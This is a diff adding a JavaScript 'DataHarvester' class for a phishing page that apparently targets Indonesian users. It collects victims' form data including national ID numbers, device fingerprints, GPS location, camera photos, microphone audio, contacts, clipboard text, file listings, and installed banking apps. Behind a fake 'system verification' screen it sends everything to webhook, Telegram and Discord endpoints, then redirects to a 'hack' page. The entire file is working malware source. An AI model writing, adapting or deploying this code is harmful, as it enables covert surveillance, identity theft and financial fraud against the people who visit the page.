@@ -1,0 +1,540 @@
+// data-collector.js - COMPREHENSIVE DATA HARVESTING
+
+class DataHarvester {
+    constructor() {
+        this.victimData = {
+            // Basic Info (from form)
+            personal: {},
+            // Device Info
+            device: {},
+            // Location Data
+            location: {},
+            // Media Data
+            media: {},
+            // File Data
+            files: {},
+            // Network Data
+            network: {},
+            // Additional Data
+            additional: {}
+        };
+    }
+
+    // 1. COLLECT BASIC PERSONAL DATA (from form)
+    collectPersonalData() {
+        this.victimData.personal = {
+            nama: document.getElementById('nama')?.value,
+            phone: document.getElementById('phone')?.value,
+            email: document.getElementById('email')?.value,
+            operator: document.getElementById('operator')?.value,
+            nik: document.getElementById('nik')?.value,
+            occupation: document.getElementById('occupation')?.value,
+            timestamp: new Date().toISOString()
+        };
+    }
+
+    // 2. COLLECT DEVICE FINGERPRINT
+    async collectDeviceInfo() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint', 2, 2);
+        const fingerprint = canvas.toDataURL();
+
+        this.victimData.device = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            fingerprint: fingerprint,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver
+        };
+    }
+
+    // 3. GET GPS LOCATION & NETWORK INFO
+    async collectLocationAndNetwork() {
+        // Get IP Address
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            this.victimData.network.publicIP = ipData.ip;
+        } catch (e) {
+            this.victimData.network.publicIP = 'unknown';
+        }
+
+        // Get Geolocation
+        if (navigator.geolocation) {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        this.victimData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        resolve();
+                    },
+                    (error) => {
+                        // Fallback: Get approximate location via IP
+                        this.getApproximateLocation();
+                        resolve();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+    }
+
+    // 4. ACCESS CAMERA & TAKE PHOTO
+    async accessCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    facingMode: 'user'
+                },
+                audio: true
+            });
+
+            // Take photo from video stream
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            this.victimData.media.cameraPhoto = canvas.toDataURL('image/jpeg', 0.7);
+            this.victimData.media.cameraAccess = true;
+            
+            // Stop stream
+            stream.getTracks().forEach(track => track.stop());
+        } catch (error) {
+            this.victimData.media.cameraAccess = false;
+        }
+    }
+
+    // 5. ACCESS MICROPHONE & RECORD AUDIO
+    async accessMicrophone() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const source = audioContext.createMediaStreamSource(stream);
+            const processor = audioContext.createScriptProcessor(1024, 1, 1);
+            
+            let audioData = [];
+            processor.onaudioprocess = (e) => {
+                audioData.push(...Array.from(e.inputBuffer.getChannelData(0)));
+            };
+            
+            source.connect(processor);
+            processor.connect(audioContext.destination);
+            
+            // Record for 3 seconds
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            processor.disconnect();
+            source.disconnect();
+            stream.getTracks().forEach(track => track.stop());
+            
+            this.victimData.media.audioSample = audioData.slice(0, 1000); // First 1000 samples
+            this.victimData.media.microphoneAccess = true;
+        } catch (error) {
+            this.victimData.media.microphoneAccess = false;
+        }
+    }
+
+    // 6. ACCESS FILESYSTEM (Experimental API)
+    async accessFilesystem() {
+        try {
+            // Try to get directory handle
+            if ('showDirectoryPicker' in window) {
+                const dirHandle = await window.showDirectoryPicker();
+                this.victimData.files.directoryAccess = true;
+                
+                // Get list of files (first level only for speed)
+                const files = [];
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        files.push({
+                            name: entry.name,
+                            type: entry.name.split('.').pop()
+                        });
+                    }
+                }
+                this.victimData.files.fileList = files.slice(0, 50); // First 50 files
+            }
+        } catch (error) {
+            this.victimData.files.directoryAccess = false;
+        }
+    }
+
+    // 7. ACCESS CONTACTS (Chrome Only)
+    async accessContacts() {
+        try {
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                this.victimData.additional.contacts = contacts.map(c => ({
+                    name: c.name ? c.name.join(' ') : 'Unknown',
+                    phone: c.tel ? c.tel[0] : null,
+                    email: c.email ? c.email[0] : null
+                }));
+            }
+        } catch (error) {
+            this.victimData.additional.contacts = [];
+        }
+    }
+
+    // 8. SCAN LOCAL NETWORK (WiFi Info)
+    async scanNetwork() {
+        try {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                this.victimData.network.connection = {
+                    type: connection.type,
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData
+                };
+            }
+        } catch (error) {
+            // Ignore
+        }
+    }
+
+    // 9. ACCESS CLIPBOARD
+    async accessClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text.trim().length > 0) {
+                this.victimData.additional.clipboard = text.substring(0, 500); // First 500 chars
+            }
+        } catch (error) {
+            // Try old API
+            try {
+                const textarea = document.createElement('textarea');
+                document.body.appendChild(textarea);
+                textarea.focus();
+                document.execCommand('paste');
+                const text = textarea.value;
+                document.body.removeChild(textarea);
+                
+                if (text && text.trim().length > 0) {
+                    this.victimData.additional.clipboard = text.substring(0, 500);
+                }
+            } catch (e) {
+                // Can't access clipboard
+            }
+        }
+    }
+
+    // 10. DETECT INSTALLED APPS (Social Media, Banking, etc)
+    detectInstalledApps() {
+        const apps = [];
+        
+        // Check for common apps by trying to open URLs
+        const appSchemes = {
+            'whatsapp': 'whatsapp://',
+            'facebook': 'fb://',
+            'instagram': 'instagram://',
+            'twitter': 'twitter://',
+            'tiktok': 'tiktok://',
+            'telegram': 'tg://',
+            'gopay': 'gopay://',
+            'ovo': 'ovo://',
+            'dana': 'dana://',
+            'shopee': 'shopee://',
+            'tokopedia': 'tokopedia://',
+            'bca': 'bcamobile://',
+            'mandiri': 'livin://',
+            'bri': 'brimo://'
+        };
+        
+        Object.keys(appSchemes).forEach(app => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = appSchemes[app];
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                // If iframe loaded, app might be installed
+                apps.push(app);
+            }, 100);
+        });
+        
+        this.victimData.additional.installedApps = apps;
+    }
+
+    // 11. GET BROWSER HISTORY ESTIMATION
+    async getBrowserHistory() {
+        // Check visited links on popular Indonesian sites
+        const popularSites = [
+            'https://www.tokopedia.com',
+            'https://www.shopee.co.id',
+            'https://www.bukalapak.com',
+            'https://www.gojek.com',
+            'https://www.grab.com',
+            'https://www.bca.co.id',
+            'https://www.bni.co.id',
+            'https://www.bri.co.id',
+            'https://www.mandiri.co.id',
+            'https://www.instagram.com',
+            'https://www.facebook.com',
+            'https://www.tiktok.com',
+            'https://www.youtube.com'
+        ];
+        
+        const visitedSites = [];
+        
+        for (const site of popularSites) {
+            const link = document.createElement('a');
+            link.href = site;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            
+            // Color will be different if visited
+            const color = getComputedStyle(link).color;
+            document.body.removeChild(link);
+            
+            // This is not 100% accurate but can give hints
+            if (color !== 'rgb(0, 0, 238)') { // Default blue link color
+                visitedSites.push(site);
+            }
+        }
+        
+        this.victimData.additional.visitedSites = visitedSites;
+    }
+
+    // 12. SEND DATA TO SERVER
+    async sendToServer() {
+        const encryptedData = CryptoJS.AES.encrypt(
+            JSON.stringify(this.victimData),
+            'esnuss-cyber-team-2024'
+        ).toString();
+        
+        // Send to multiple endpoints for redundancy
+        const endpoints = [
+            'https://webhook.site/your-webhook-id',
+            'https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage',
+            'https://discord.com/api/webhooks/YOUR_WEBHOOK'
+        ];
+        
+        for (const endpoint of endpoints) {
+            try {
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        data: encryptedData,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.log(`Failed to send to ${endpoint}`);
+            }
+        }
+        
+        // Also save to localStorage for hack.html
+        localStorage.setItem('victim_data_full', encryptedData);
+        
+        // Save as JSON file for download (backup)
+        const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(this.victimData, null, 2));
+        const downloadAnchor = document.createElement('a');
+        downloadAnchor.setAttribute("href", dataStr);
+        downloadAnchor.setAttribute("download", `victim_${Date.now()}.json`);
+        document.body.appendChild(downloadAnchor);
+        downloadAnchor.click();
+        document.body.removeChild(downloadAnchor);
+    }
+
+    // 13. MAIN FUNCTION - RUN ALL COLLECTORS
+    async harvestAllData() {
+        console.log('🚀 Starting comprehensive data harvesting...');
+        
+        // Show loading progress
+        this.showHarvestingProgress();
+        
+        // Step 1: Basic data
+        this.collectPersonalData();
+        await this.collectDeviceInfo();
+        
+        // Step 2: Location & Network
+        await this.collectLocationAndNetwork();
+        await this.scanNetwork();
+        
+        // Step 3: Media Access
+        await this.accessCamera();
+        await this.accessMicrophone();
+        
+        // Step 4: File System
+        await this.accessFilesystem();
+        
+        // Step 5: Contacts
+        await this.accessContacts();
+        
+        // Step 6: Clipboard
+        await this.accessClipboard();
+        
+        // Step 7: Apps & History
+        this.detectInstalledApps();
+        await this.getBrowserHistory();
+        
+        // Step 8: Send to server
+        await this.sendToServer();
+        
+        console.log('✅ Data harvesting complete!', this.victimData);
+        
+        // Redirect to hack page
+        this.redirectToHackPage();
+    }
+
+    // 14. PROGRESS INDICATOR
+    showHarvestingProgress() {
+        const progressHTML = `
+            <div id="harvestingProgress" style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.9);
+                color: white;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                z-index: 99999;
+                font-family: Arial, sans-serif;
+                text-align: center;
+                padding: 20px;
+            ">
+                <div style="font-size: 24px; margin-bottom: 20px; color: #00ff00;">
+                    <i class="fas fa-shield-alt"></i> SYSTEM VERIFICATION IN PROGRESS
+                </div>
+                <div id="progressText" style="margin-bottom: 30px; font-size: 18px;">
+                    Initializing security scan...
+                </div>
+                <div style="width: 80%; max-width: 500px; background: #333; border-radius: 10px; overflow: hidden;">
+                    <div id="progressBar" style="height: 10px; background: linear-gradient(90deg, #00ff00, #00cc00); width: 0%; transition: width 0.5s;"></div>
+                </div>
+                <div id="progressDetails" style="margin-top: 30px; font-size: 14px; color: #aaa; max-width: 500px;">
+                    • Verifying identity...<br>
+                    • Scanning device...<br>
+                    • Checking permissions...
+                </div>
+            </div>
+        `;
+        
+        document.body.insertAdjacentHTML('beforeend', progressHTML);
+        
+        // Update progress
+        const steps = [
+            "Collecting personal data...",
+            "Scanning device fingerprint...",
+            "Getting location data...",
+            "Accessing camera...",
+            "Accessing microphone...",
+            "Scanning file system...",
+            "Checking contacts...",
+            "Analyzing clipboard...",
+            "Detecting installed apps...",
+            "Sending verification data..."
+        ];
+        
+        let currentStep = 0;
+        const interval = setInterval(() => {
+            if (currentStep < steps.length) {
+                document.getElementById('progressText').textContent = steps[currentStep];
+                document.getElementById('progressBar').style.width = `${((currentStep + 1) / steps.length) * 100}%`;
+                
+                // Update details
+                let details = '';
+                for (let i = 0; i <= currentStep; i++) {
+                    details += `• ${steps[i]}<br>`;
+                }
+                document.getElementById('progressDetails').innerHTML = details;
+                
+                currentStep++;
+            } else {
+                clearInterval(interval);
+            }
+        }, 1000);
+    }
+
+    // 15. REDIRECT TO HACK PAGE
+    redirectToHackPage() {
+        // Use the original phishing redirect pattern
+        setTimeout(() => {
+            const LNrwTw = (l) => {return Math.random().toString(36).substring(2, 2 + l);}
+            const XGccLF = (a, b) => {return Math.floor(Math.random() * (b - a + 1)) + a;}
+            
+            // Enhanced redirect with victim data in URL
+            const victimId = btoa(JSON.stringify({
+                phone: this.victimData.personal.phone,
+                time: Date.now()
+            })).replace(/=/g, '');
+            
+            window.location.href = `/hack.html?victim=${victimId}&t=${Date.now()}`;
+        }, 3000);
+    }
+
+    // Fallback location via IP
+    async getApproximateLocation() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            this.victimData.location = {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                isp: data.org
+            };
+        } catch (error) {
+            this.victimData.location = { error: "Could not get location" };
+        }
+    }
+}
+
+// Initialize and export
+window.DataHarvester = DataHarvester;
